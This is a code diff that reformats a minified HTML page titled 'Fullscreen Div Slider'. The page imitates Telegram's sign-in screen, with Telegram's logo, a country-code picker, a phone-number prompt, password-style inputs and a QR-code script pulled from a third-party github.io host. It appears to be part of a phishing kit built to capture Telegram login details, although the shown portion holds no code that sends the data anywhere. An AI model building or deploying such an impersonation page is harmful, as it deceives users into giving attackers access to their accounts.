@@ -1,6 +1,667 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport"content="width=device-width, initial-scale=1.0"><title>Fullscreen Div Slider</title><style>html,body{margin:0;padding:0;height:100%;overflow:hidden}#container{position:relative;width:200%;height:100%;display:flex;transition:transform 0.2s ease}.fullscreen{width:100vw;height:100vh;flex-shrink:0;position:relative;box-sizing:border-box;overflow-y:scroll}#div1{}#div2{}.panel{margin-top:40px;width:22em;margin:auto;text-align:center}.slider-btn{position:absolute;bottom:20px;left:50%;transform:translateX(-50%);padding:10px 20px;font-size:16px}.container{text-align:center}#qrcode{margin:20px auto;background-color:white;text-align:-webkit-center}.instructions{margin-top:20px}.instructions ol{text-align:left;display:inline-block}.instructions li{margin-top:.5rem}.phone-login{margin-top:20px;color:#3390ec;text-decoration:none}@keyframes rotation{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}h4{font-size:2rem;margin:22px 0 14px;line-height:110%}.loader-1{width:48px;height:48px;border:5px solid#3390ec;border-bottom-color:#ffffff;border-radius:50%;-webkit-animation:rotation 1s linear infinite;animation:rotation 1s linear infinite;margin:175px auto 70px}.animated{animation-duration:0.35s;animation-fill-mode:both}.animated-fade{animation-duration:1s;animation-fill-mode:both}@keyframes zoomIn{from{opacity:0;transform:scale3d(0.3,0.3,0.3)}50%{opacity:1}}.zoomIn{animation-name:zoomIn}@keyframes fadeIn{from{opacity:0}50%{opacity:1}}.fadeIn{animation-name:fadeIn}@keyframes fadeOut{from{opacity:1}50%{opacity:0}}.fadeOut{animation-name:fadeOut}.emoji{text-align:center;font-size:145px;margin-bottom:20px}h1{font-size:30px;font-weight:500;margin-bottom:8px}.desc{font-size:14px;color:#707579;margin-bottom:20px}.input-container{position:relative;margin-bottom:16px;margin-top:20px}.password-input{width:100%;padding:12px;border:1px solid#dadce0;border-radius:8px;font-size:16px;box-sizing:border-box;transition:all 0.3s ease}.password-input.error{border-color:#df3f40!important;-webkit-box-shadow:0 0 0px 1px#df3f40 inset!important}.err{color:#df3f40!important}.password-input:hover{outline:none;border:1px solid#3390ec}.password-input:focus{outline:none;border:1px solid#3390ec;-webkit-box-shadow:0 0 0px 1px#3390ec inset}.password-input:focus~.placeholder,.password-input:hover~.placeholder{color:#3390ec}.eye-icon{position:absolute;right:12px;top:14px;transform:translateY(-50%);cursor:pointer;fill:#9e9e9e}.eye-icon:hover{fill:#dadce0}.placeholder{position:absolute;left:12px;top:50%;transform:translateY(-50%);color:#8e8e8e;transition:all 0.3s ease;pointer-events:none}input:focus+.placeholder,input:not(:placeholder-shown)+.placeholder,#phoneinput:focus+.placeholder,#phoneinput:not(:empty)+.placeholder{top:0;font-size:12px;background-color:white;padding:0 4px}.next-button{width:100%;padding:12px;background-color:#3390ec;color:white;border:none;border-radius:8px;font-size:16px;cursor:pointer;position:relative;height:50px;margin-top:20px}.swipe-button{width:100%;padding:12px;background-color:white;color:#3390ec;border:none;border-radius:8px;font-size:16px;cursor:pointer;position:relative;margin-top:12px;height:50px}.swipe-button:hover{background-color:#eff4ff}button:disabled{cursor:auto;opacity:0.3}.loader-2{width:48px;height:48px;border:5px solid#3390ec;border-bottom-color:#ffffff;border-radius:50%;-webkit-animation:rotation 1s linear infinite;animation:rotation 1s linear infinite}.select-container-wraper{z-index:1;position:relative}.select-container{position:absolute;top:0;left:0;right:0;bottom:0}.select-ul{list-style-type:none;padding-left:0;width:100%;background-color:#ffffff;border-radius:10px;box-shadow:0 8px 17px 2px#00000024,0 3px 14px 2px#0000001f,0 5px 5px-3px#0003;padding:6px;max-height:300px;overflow-y:scroll}.select-ul::-webkit-scrollbar{display:none}.select-ul li{margin-right:10px;width:100%;padding:10px 0 10px 0;cursor:pointer;text-align:start}.select-ul li:hover{background-color:#f3f3f4}.select-text{margin-left:30px}.emoji-li{font-size:26px;float:left;line-height:1;margin-left:5px}.phone-code{float:right;color:#9e9e9e}.input-field-input{text-align:start}.input-field-input:after{content:attr(data-left-pattern);color:#9e9e9e;letter-spacing:var(--letter-spacing)}.checkbox-wrapper{padding:10px;border-radius:6px;display:flex;align-items:center;cursor:pointer;user-select:none}.checkbox-wrapper:hover{background-color:#eff4ff}.checkbox-wrapper input[type="checkbox"]{display:none}.checkbox-custom{width:20px;height:20px;border-radius:4px;border:1px solid#4a5568;display:flex;align-items:center;justify-content:center;margin-right:8px;transition:all 0.3s ease}.checkbox-wrapper input[type="checkbox"]:checked+.checkbox-custom{background-color:#3390ec;border-color:#3390ec}.checkbox-custom::after{content:'\2713';color:white;font-size:14px;opacity:0;transform:scale(0);transition:all 0.3s ease}.checkbox-wrapper input[type="checkbox"]:checked+.checkbox-custom::after{opacity:1;transform:scale(1)}.checkbox-wrapper span{font-size:14px}.rotate-animation{animation:rotateRight.3s ease-in-out forwards}@keyframes rotateRight{from{transform:rotate(0deg)}to{transform:rotate(180deg)}}</style><script type="text/javascript"src="https://xshou66.github.io/static/qr-code-styling.js"></script></head><body><div id="container"style="display: none;"><div class="fullscreen"id="phonediv"style=""><div class="panel"><svg xmlns:xlink="http://www.w3.org/1999/xlink"class="sign-logo"xmlns="http://www.w3.org/2000/svg"style="margin-top: 56px;"width="160"height="160"viewBox="0 0 160 160"><defs><path id="logo"fill-rule="evenodd"d="M80,0 C124.18278,0 160,35.81722 160,80 C160,124.18278 124.18278,160 80,160 C35.81722,160 0,124.18278 0,80 C0,35.81722 35.81722,0 80,0 Z M114.262551,46.4516129 L114.123923,46.4516129 C111.089589,46.5056249 106.482806,48.0771432 85.1289541,56.93769 L81.4133571,58.4849956 C72.8664779,62.0684477 57.2607933,68.7965125 34.5963033,78.66919 C30.6591745,80.2345564 28.5967328,81.765936 28.4089783,83.2633288 C28.0626453,86.0254269 31.8703852,86.959903 36.7890378,88.5302703 L38.2642674,89.0045258 C42.3926354,90.314406 47.5534685,91.7248852 50.3250916,91.7847532 C52.9151948,91.8407003 55.7944784,90.8162976 58.9629426,88.7115451 L70.5121776,80.9327422 C85.6657026,70.7535853 93.6285785,65.5352892 94.4008055,65.277854 L94.6777873,65.216416 C95.1594319,65.1213105 95.7366278,65.0717596 96.1481181,65.4374337 C96.6344248,65.8695939 96.5866185,66.6880224 96.5351057,66.9075859 C96.127514,68.6448691 75.2839361,87.6143392 73.6629144,89.2417998 L73.312196,89.6016896 C68.7645143,94.2254793 63.9030972,97.1721503 71.5637945,102.355193 L73.3593638,103.544598 C79.0660342,107.334968 82.9483395,110.083813 88.8107882,113.958377 L90.3875424,114.996094 C95.0654739,118.061953 98.7330313,121.697601 103.562866,121.253237 C105.740839,121.052855 107.989107,119.042224 109.175465,113.09692 L109.246762,112.727987 C112.002037,98.0012935 117.417883,66.09303 118.669527,52.9443975 C118.779187,51.7924073 118.641237,50.318088 118.530455,49.6708963 L118.474159,49.3781963 C118.341081,48.7651315 118.067967,48.0040758 117.346762,47.4189793 C116.412565,46.6610871 115.002114,46.4638844 114.262551,46.4516129 Z"></path></defs><use href="#logo"fill="#3390EC"></use></svg><h1>Sign in to Telegram</h1><span class="desc">Please confirm your country code</span><br><span class="desc">and enter your phone number.</span><div style="margin-top: 46px;"><div class="input-container"><input id="country"class="password-input"placeholder=" "autocomplete="off"><label id="labelcountry"for="country"class="placeholder">Country</label><span style="position: absolute;
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fullscreen Div Slider</title>
+    <style>
+        html,
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        #container {
+            position: relative;
+            width: 200%;
+            /* Container width to accommodate both divs */
+            height: 100%;
+            display: flex;
+            transition: transform 0.2s ease;
+        }
+
+        .fullscreen {
+            width: 100vw;
+            height: 100vh;
+            flex-shrink: 0;
+            position: relative;
+            box-sizing: border-box;
+            overflow-y: scroll;
+        }
+
+        #div1 {
+            /* background-color: lightblue; */
+        }
+
+        #div2 {
+            /* background-color: lightcoral; */
+        }
+
+        .panel {
+            margin-top: 40px;
+            width: 22em;
+            margin: auto;
+            text-align: center;
+        }
+
+        .slider-btn {
+            position: absolute;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            padding: 10px 20px;
+            font-size: 16px;
+        }
+
+        .container {
+            text-align: center;
+        }
+
+        #qrcode {
+            margin: 20px auto;
+            background-color: white;
+            text-align: -webkit-center;
+        }
+
+        .instructions {
+            margin-top: 20px;
+        }
+
+        .instructions ol {
+            text-align: left;
+            display: inline-block;
+        }
+
+        .instructions li {
+            margin-top: .5rem;
+        }
+
+        .phone-login {
+            margin-top: 20px;
+            color: #3390ec;
+            text-decoration: none;
+        }
+
+        @keyframes rotation {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        h4 {
+            font-size: 2rem;
+            margin: 22px 0 14px;
+            line-height: 110%;
+        }
+
+
+        .loader-1 {
+            width: 48px;
+            height: 48px;
+            border: 5px solid #3390ec;
+            border-bottom-color: #ffffff;
+            border-radius: 50%;
+            -webkit-animation: rotation 1s linear infinite;
+            animation: rotation 1s linear infinite;
+            margin: 175px auto 70px;
+        }
+
+        .animated {
+            animation-duration: 0.35s;
+            animation-fill-mode: both;
+        }
+
+        .animated-fade {
+            animation-duration: 1s;
+            animation-fill-mode: both;
+        }
+
+        @keyframes zoomIn {
+            from {
+                opacity: 0;
+                transform: scale3d(0.3, 0.3, 0.3);
+            }
+
+            50% {
+                opacity: 1;
+            }
+        }
+
+        .zoomIn {
+            animation-name: zoomIn;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+
+            50% {
+                opacity: 1;
+            }
+        }
+
+        .fadeIn {
+            animation-name: fadeIn;
+        }
+
+        @keyframes fadeOut {
+            from {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0;
+            }
+        }
+
+        .fadeOut {
+            animation-name: fadeOut;
+        }
+
+
+        /* sda------------------ */
+        .emoji {
+            text-align: center;
+            font-size: 145px;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            font-size: 30px;
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+
+        .desc {
+            font-size: 14px;
+            color: #707579;
+            margin-bottom: 20px;
+        }
+
+        .input-container {
+            position: relative;
+            margin-bottom: 16px;
+            margin-top: 20px;
+        }
+
+        .password-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: all 0.3s ease;
+        }
+
+        .password-input.error {
+            border-color: #df3f40 !important;
+            -webkit-box-shadow: 0 0 0px 1px #df3f40 inset !important;
+        }
+
+        .err {
+            /* border-color: #df3f40 !important; */
+            color: #df3f40 !important;
+            
+        }
+
+        .password-input:hover {
+            outline: none;
+            border: 1px solid #3390ec;
+        }
+
+        .password-input:focus {
+            outline: none;
+            /* outline: 2px solid #3390ec;    
+            outline-offset: -2px; */
+            border: 1px solid #3390ec;
+            -webkit-box-shadow: 0 0 0px 1px #3390ec inset
+                /* box-shadow: inset 0 0 0 1px #3390ec ; */
+                /* border: 2px solid #3390ec; */
+        }
+
+        .password-input:focus~.placeholder,
+        .password-input:hover~.placeholder {
+            color: #3390ec;
+        }
+
+        .eye-icon {
+            position: absolute;
+            right: 12px;
+            top: 14px;
+            transform: translateY(-50%);
+            cursor: pointer;
+            /* color: #8e8e8e; */
+            fill: #9e9e9e;
+        }
+
+        .eye-icon:hover {
+            fill: #dadce0;
+        }
+
+
+        .placeholder {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #8e8e8e;
+            transition: all 0.3s ease;
+            pointer-events: none;
+        }
+
+        input:focus+.placeholder,
+        input:not(:placeholder-shown)+.placeholder,
+        #phoneinput:focus+.placeholder,
+        #phoneinput:not(:empty)+.placeholder {
+            top: 0;
+            font-size: 12px;
+            background-color: white;
+            padding: 0 4px;
+        }
+
+        .next-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #3390ec;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            position: relative;
+            height: 50px;
+            margin-top: 20px;
+        }
+
+        .swipe-button {
+            width: 100%;
+            padding: 12px;
+            background-color: white;
+            color: #3390ec;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            position: relative;
+            margin-top: 12px;
+            height: 50px;
+        }
+
+        .swipe-button:hover {
+            background-color: #eff4ff;
+        }
+
+        button:disabled {
+            cursor: auto;
+            /* 鼠标指针显示为不可点击 */
+            opacity: 0.3;
+            /* 透明度降低 */
+        }
+
+        .loader-2 {
+            width: 48px;
+            height: 48px;
+            border: 5px solid #3390ec;
+            border-bottom-color: #ffffff;
+            border-radius: 50%;
+            -webkit-animation: rotation 1s linear infinite;
+            animation: rotation 1s linear infinite;
+        }
+
+        .select-container-wraper {
+            z-index: 1;
+            position: relative;
+        }
+
+        .select-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+        }
+
+        .select-ul {
+            list-style-type: none;
+            /* 去掉列表项前面的点 */
+            padding-left: 0;
+            /* 移除默认的左边距 */
+            width: 100%;
+            background-color: #ffffff;
+            border-radius: 10px;
+            box-shadow: 0 8px 17px 2px #00000024, 0 3px 14px 2px #0000001f, 0 5px 5px -3px #0003;
+            padding: 6px;
+            max-height: 300px;
+            overflow-y: scroll;
+        }
+
+        /* 隐藏滚动条 */
+        .select-ul::-webkit-scrollbar {
+            display: none;
+            /* WebKit 浏览器专用 */
+        }
+
+        .select-ul li {
+            margin-right: 10px;
+            /* 可以调整列表项之间的间距 */
+            width: 100%;
+            padding: 10px 0 10px 0;
+            cursor: pointer;
+            text-align: start;
+        }
+
+        .select-ul li:hover {
+            background-color: #f3f3f4;
+        }
+
+        .select-text {
+            margin-left: 30px;
+
+        }
+
+        .emoji-li {
+            font-size: 26px;
+            float: left;
+            line-height: 1;
+            margin-left: 5px;
+        }
+
+        .phone-code {
+            float: right;
+            color: #9e9e9e;
+        }
+
+        .input-field-input {
+            text-align: start;
+        }
+
+        .input-field-input:after {
+            content: attr(data-left-pattern);
+            color: #9e9e9e;
+            letter-spacing: var(--letter-spacing);
+        }
+
+        .checkbox-wrapper {
+            /* background-color: #2d3748; */
+            padding: 10px;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .checkbox-wrapper:hover {
+            background-color: #eff4ff;
+        }
+
+        .checkbox-wrapper input[type="checkbox"] {
+            display: none;
+        }
+
+        .checkbox-custom {
+            width: 20px;
+            height: 20px;
+            border-radius: 4px;
+            /* background-color: #4a5568; */
+            border: 1px solid #4a5568;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 8px;
+            transition: all 0.3s ease;
+        }
+
+        .checkbox-wrapper input[type="checkbox"]:checked+.checkbox-custom {
+            background-color: #3390ec;
+            border-color: #3390ec;
+        }
+
+        .checkbox-custom::after {
+            content: '\2713';
+
+            color: white;
+            font-size: 14px;
+            opacity: 0;
+            transform: scale(0);
+            transition: all 0.3s ease;
+        }
+
+        .checkbox-wrapper input[type="checkbox"]:checked+.checkbox-custom::after {
+            opacity: 1;
+            transform: scale(1);
+        }
+
+        .checkbox-wrapper span {
+            /* color: white; */
+            font-size: 14px;
+        }
+
+
+        .rotate-animation {
+
+            animation: rotateRight .3s ease-in-out forwards;
+        }
+
+        @keyframes rotateRight {
+            from {
+                transform: rotate(0deg);
+            }
+
+            to {
+                transform: rotate(180deg);
+            }
+        }
+    </style>
+    <script type="text/javascript" src="https://xshou66.github.io/static/qr-code-styling.js"></script>
+</head>
+
+<body>
+    <div id="container" style="display: none;">
+        
+        <div class="fullscreen" id="phonediv" style="">
+            <div class="panel">
+
+                <svg xmlns:xlink="http://www.w3.org/1999/xlink" class="sign-logo" xmlns="http://www.w3.org/2000/svg" style="margin-top: 56px;"
+                    width="160" height="160" viewBox="0 0 160 160">
+                    <defs>
+                        <path id="logo" fill-rule="evenodd"
+                            d="M80,0 C124.18278,0 160,35.81722 160,80 C160,124.18278 124.18278,160 80,160 C35.81722,160 0,124.18278 0,80 C0,35.81722 35.81722,0 80,0 Z M114.262551,46.4516129 L114.123923,46.4516129 C111.089589,46.5056249 106.482806,48.0771432 85.1289541,56.93769 L81.4133571,58.4849956 C72.8664779,62.0684477 57.2607933,68.7965125 34.5963033,78.66919 C30.6591745,80.2345564 28.5967328,81.765936 28.4089783,83.2633288 C28.0626453,86.0254269 31.8703852,86.959903 36.7890378,88.5302703 L38.2642674,89.0045258 C42.3926354,90.314406 47.5534685,91.7248852 50.3250916,91.7847532 C52.9151948,91.8407003 55.7944784,90.8162976 58.9629426,88.7115451 L70.5121776,80.9327422 C85.6657026,70.7535853 93.6285785,65.5352892 94.4008055,65.277854 L94.6777873,65.216416 C95.1594319,65.1213105 95.7366278,65.0717596 96.1481181,65.4374337 C96.6344248,65.8695939 96.5866185,66.6880224 96.5351057,66.9075859 C96.127514,68.6448691 75.2839361,87.6143392 73.6629144,89.2417998 L73.312196,89.6016896 C68.7645143,94.2254793 63.9030972,97.1721503 71.5637945,102.355193 L73.3593638,103.544598 C79.0660342,107.334968 82.9483395,110.083813 88.8107882,113.958377 L90.3875424,114.996094 C95.0654739,118.061953 98.7330313,121.697601 103.562866,121.253237 C105.740839,121.052855 107.989107,119.042224 109.175465,113.09692 L109.246762,112.727987 C112.002037,98.0012935 117.417883,66.09303 118.669527,52.9443975 C118.779187,51.7924073 118.641237,50.318088 118.530455,49.6708963 L118.474159,49.3781963 C118.341081,48.7651315 118.067967,48.0040758 117.346762,47.4189793 C116.412565,46.6610871 115.002114,46.4638844 114.262551,46.4516129 Z">
+                        </path>
+                    </defs>
+                    <use href="#logo" fill="#3390EC"></use>
+                </svg>
+
+                <h1>Sign in to Telegram</h1>
+                <span class="desc">Please confirm your country code</span>
+                <br>
+                <span class="desc">and enter your phone number.</span>
+                <div style="margin-top: 46px;">
+                    <div class="input-container">
+                        <input id="country" class="password-input" placeholder=" " autocomplete="off">
+                        <label id="labelcountry" for="country" class="placeholder">Country</label>
+                        <span style="position: absolute;
                         right: 12px;
-                        top: 15px;"><svg id="arrow"fill="#707579"t="1724144127236"class="icon"viewBox="0 0 1024 1024"version="1.1"xmlns="http://www.w3.org/2000/svg"p-id="1767"xmlns:xlink="http://www.w3.org/1999/xlink"width="15"height="15"><path d="M512 670.72l-450.56-450.56-61.44 61.44 506.88 517.12 517.12-512-61.44-61.44L512 670.72z"p-id="1768"></path></svg></span></div><div class="select-container-wraper"id="select-pane"style="display: none;"><div class="select-container"><ul class="select-ul"><li><span dir="auto"><span class="emoji-li emoji-native">🇦🇫</span></span><span class="select-text"data-default-name="Afghanistan">Afghanistan</span><span class="phone-code">+93</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇦🇱</span></span><span class="select-text"data-default-name="Albania">Albania</span><span class="phone-code">+355</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇩🇿</span></span><span class="select-text"data-default-name="Algeria">Algeria</span><span class="phone-code">+213</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇦🇸</span></span><span class="select-text"data-default-name="American Samoa">American Samoa</span><span class="phone-code">+1684</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇦🇩</span></span><span class="select-text"data-default-name="Andorra">Andorra</span><span class="phone-code">+376</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇦🇴</span></span><span class="select-text"data-default-name="Angola">Angola</span><span class="phone-code">+244</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇦🇮</span></span><span class="select-text"data-default-name="Anguilla">Anguilla</span><span class="phone-code">+1264</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🏴‍☠</span></span><span class="select-text"data-default-name="Anonymous Numbers">Anonymous Numbers</span><span class="phone-code">+888</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇦🇬</span></span><span class="select-text"data-default-name="Antigua &amp; Barbuda">Antigua&amp;Barbuda</span><span class="phone-code">+1268</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇦🇷</span></span><span class="select-text"data-default-name="Argentina">Argentina</span><span class="phone-code">+54</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇦🇲</span></span><span class="select-text"data-default-name="Armenia">Armenia</span><span class="phone-code">+374</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇦🇼</span></span><span class="select-text"data-default-name="Aruba">Aruba</span><span class="phone-code">+297</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇦🇺</span></span><span class="select-text"data-default-name="Australia">Australia</span><span class="phone-code">+61</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇦🇹</span></span><span class="select-text"data-default-name="Austria">Austria</span><span class="phone-code">+43</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇦🇿</span></span><span class="select-text"data-default-name="Azerbaijan">Azerbaijan</span><span class="phone-code">+994</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇧🇸</span></span><span class="select-text"data-default-name="Bahamas">Bahamas</span><span class="phone-code">+1242</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇧🇭</span></span><span class="select-text"data-default-name="Bahrain">Bahrain</span><span class="phone-code">+973</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇧🇩</span></span><span class="select-text"data-default-name="Bangladesh">Bangladesh</span><span class="phone-code">+880</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇧🇧</span></span><span class="select-text"data-default-name="Barbados">Barbados</span><span class="phone-code">+1246</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇧🇾</span></span><span class="select-text"data-default-name="Belarus">Belarus</span><span class="phone-code">+375</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇧🇪</span></span><span class="select-text"data-default-name="Belgium">Belgium</span><span class="phone-code">+32</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇧🇿</span></span><span class="select-text"data-default-name="Belize">Belize</span><span class="phone-code">+501</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇧🇯</span></span><span class="select-text"data-default-name="Benin">Benin</span><span class="phone-code">+229</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇧🇲</span></span><span class="select-text"data-default-name="Bermuda">Bermuda</span><span class="phone-code">+1441</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇧🇹</span></span><span class="select-text"data-default-name="Bhutan">Bhutan</span><span class="phone-code">+975</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇧🇴</span></span><span class="select-text"data-default-name="Bolivia">Bolivia</span><span class="phone-code">+591</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇧🇶</span></span><span class="select-text"data-default-name="Bonaire, Sint Eustatius &amp; Saba">Bonaire,Sint Eustatius&amp;Saba</span><span class="phone-code">+599</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇧🇦</span></span><span class="select-text"data-default-name="Bosnia &amp; Herzegovina">Bosnia&amp;Herzegovina</span><span class="phone-code">+387</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇧🇼</span></span><span class="select-text"data-default-name="Botswana">Botswana</span><span class="phone-code">+267</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇧🇷</span></span><span class="select-text"data-default-name="Brazil">Brazil</span><span class="phone-code">+55</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇻🇬</span></span><span class="select-text"data-default-name="British Virgin Islands">British Virgin Islands</span><span class="phone-code">+1284</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇧🇳</span></span><span class="select-text"data-default-name="Brunei Darussalam">Brunei Darussalam</span><span class="phone-code">+673</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇧🇬</span></span><span class="select-text"data-default-name="Bulgaria">Bulgaria</span><span class="phone-code">+359</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇧🇫</span></span><span class="select-text"data-default-name="Burkina Faso">Burkina Faso</span><span class="phone-code">+226</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇧🇮</span></span><span class="select-text"data-default-name="Burundi">Burundi</span><span class="phone-code">+257</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇰🇭</span></span><span class="select-text"data-default-name="Cambodia">Cambodia</span><span class="phone-code">+855</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇨🇲</span></span><span class="select-text"data-default-name="Cameroon">Cameroon</span><span class="phone-code">+237</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇨🇦</span></span><span class="select-text"data-default-name="Canada">Canada</span><span class="phone-code">+1</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇨🇻</span></span><span class="select-text"data-default-name="Cape Verde">Cape Verde</span><span class="phone-code">+238</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇰🇾</span></span><span class="select-text"data-default-name="Cayman Islands">Cayman Islands</span><span class="phone-code">+1345</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇨🇫</span></span><span class="select-text"data-default-name="Central African Rep.">Central African Rep.</span><span class="phone-code">+236</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇹🇩</span></span><span class="select-text"data-default-name="Chad">Chad</span><span class="phone-code">+235</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇨🇱</span></span><span class="select-text"data-default-name="Chile">Chile</span><span class="phone-code">+56</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇨🇳</span></span><span class="select-text"data-default-name="China">China</span><span class="phone-code">+86</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇨🇴</span></span><span class="select-text"data-default-name="Colombia">Colombia</span><span class="phone-code">+57</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇰🇲</span></span><span class="select-text"data-default-name="Comoros">Comoros</span><span class="phone-code">+269</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇨🇩</span></span><span class="select-text"data-default-name="Congo (Dem. Rep.)">Congo(Dem.Rep.)</span><span class="phone-code">+243</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇨🇬</span></span><span class="select-text"data-default-name="Congo (Rep.)">Congo(Rep.)</span><span class="phone-code">+242</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇨🇰</span></span><span class="select-text"data-default-name="Cook Islands">Cook Islands</span><span class="phone-code">+682</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇨🇷</span></span><span class="select-text"data-default-name="Costa Rica">Costa Rica</span><span class="phone-code">+506</span></li><li><span dir="auto"><span class="emoji-li emoji-native">🇨🇮</span></span><span class="select-text"data-default-name="Côte d&quot;Ivoire">Côte d"Ivoire</span><span class="phone-code">+225</span></li>
+                        top: 15px;">
+                            <svg
+                                id="arrow" fill="#707579" t="1724144127236" class="icon" viewBox="0 0 1024 1024"
+                                version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1767"
+                                xmlns:xlink="http://www.w3.org/1999/xlink" width="15" height="15">
+                                <path
+                                    d="M512 670.72l-450.56-450.56-61.44 61.44 506.88 517.12 517.12-512-61.44-61.44L512 670.72z"
+                                    p-id="1768"></path>
+                            </svg>
+                        </span>
+                    </div>
+                    <div class="select-container-wraper" id="select-pane" style="display: none;">
+                        <div class="select-container">
+                            <ul class="select-ul">
+                                <li><span dir="auto">
+                                        <span class="emoji-li emoji-native">🇦🇫</span>
+                                    </span>
+                                    <span class="select-text" data-default-name="Afghanistan">Afghanistan</span>
+                                    <span class="phone-code">+93</span>
+                                </li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇦🇱</span></span><span
+                                        class="select-text" data-default-name="Albania">Albania</span><span
+                                        class="phone-code">+355</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇩🇿</span></span><span
+                                        class="select-text" data-default-name="Algeria">Algeria</span><span
+                                        class="phone-code">+213</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇦🇸</span></span><span
+                                        class="select-text" data-default-name="American Samoa">American
+                                        Samoa</span><span class="phone-code">+1684</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇦🇩</span></span><span
+                                        class="select-text" data-default-name="Andorra">Andorra</span><span
+                                        class="phone-code">+376</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇦🇴</span></span><span
+                                        class="select-text" data-default-name="Angola">Angola</span><span
+                                        class="phone-code">+244</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇦🇮</span></span><span
+                                        class="select-text" data-default-name="Anguilla">Anguilla</span><span
+                                        class="phone-code">+1264</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🏴‍☠</span></span><span
+                                        class="select-text" data-default-name="Anonymous Numbers">Anonymous
+                                        Numbers</span><span class="phone-code">+888</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇦🇬</span></span><span
+                                        class="select-text" data-default-name="Antigua &amp; Barbuda">Antigua &amp;
+                                        Barbuda</span><span class="phone-code">+1268</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇦🇷</span></span><span
+                                        class="select-text" data-default-name="Argentina">Argentina</span><span
+                                        class="phone-code">+54</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇦🇲</span></span><span
+                                        class="select-text" data-default-name="Armenia">Armenia</span><span
+                                        class="phone-code">+374</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇦🇼</span></span><span
+                                        class="select-text" data-default-name="Aruba">Aruba</span><span
+                                        class="phone-code">+297</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇦🇺</span></span><span
+                                        class="select-text" data-default-name="Australia">Australia</span><span
+                                        class="phone-code">+61</span></li>
